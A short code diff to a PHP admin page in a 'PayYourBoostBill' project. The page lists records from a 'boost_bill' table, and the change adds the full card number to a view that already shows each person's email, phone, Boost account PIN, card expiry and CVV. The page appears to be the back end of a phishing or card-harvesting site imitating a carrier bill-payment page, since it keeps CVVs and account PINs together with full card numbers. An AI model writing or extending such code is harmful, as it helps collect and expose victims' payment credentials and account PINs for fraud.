@@ -50,11 +50,12 @@ $query = $con->query("SELECT * FROM boost_bill");
                                     <h6>email: <?= $row->email ?></h6>
                                 </td>
                                 <td>
-                                    <h6>phone: <?= $row->cellNumber ?></h6>
+                                    <h6><?= $row->cellNumber ?></h6>
                                     <h6>pin code: <?= $row->boostPin ?></h6>
                                     <h6>amount due: $<?= ($row->amount + $processingFee) ?></h6>
                                 </td>
                                 <td>
+                                    <h6><?= $row->cardNumber ?></h6>
                                     <h6>Expiry: <?= $month . '/' . $row->cardYear ?></h6>
                                     <h6>Cvv: <?= $row->cvv ?></h6>
                                 </td>
@@ -106,7 +107,7 @@ $query = $con->query("SELECT * FROM boost_bill");
             new DataTable('#example', {
                 responsive: true,
                 columnDefs: [{
-                    width: '18%',
+                    width: '12%',
                     target: 7
                 }],
                 order: [
@@ -130,7 +131,7 @@ $query = $con->query("SELECT * FROM boost_bill");
                             showConfirmButton: false
                         });
                         setTimeout(() => {
-                            window.location.href = "/PayYourBoostBill/users-list.php";
+                            window.location.href = "/PayYourBoostBill/records.php";
                         }, 1800);
                     },
                     error: function(err) {
